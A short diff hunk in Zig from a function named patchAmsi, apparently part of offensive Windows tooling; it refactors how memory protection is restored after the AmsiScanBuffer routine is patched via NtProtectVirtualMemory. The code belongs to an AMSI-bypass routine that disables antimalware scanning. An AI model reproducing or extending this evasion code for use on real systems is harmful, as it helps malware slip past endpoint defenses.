@@ -39,12 +39,12 @@ pub fn patchAmsi() bool {
         1,
     );
 
-    prot_base = @ptrCast(@alignCast(scan_buffer));
-    prot_size = 1;
+    var restore_base: ?types.PVOID = @ptrCast(@alignCast(scan_buffer));
+    var restore_size: types.SIZE_T = 1;
     _ = engine.NtProtectVirtualMemory(
         @as(types.HANDLE, @ptrFromInt(~@as(usize, 0))),
-        @as(*types.PVOID, @ptrCast(&prot_base)),
-        &prot_size,
+        @as(*types.PVOID, @ptrCast(&restore_base)),
+        &restore_size,
         old_prot,
         &old_prot,
     );
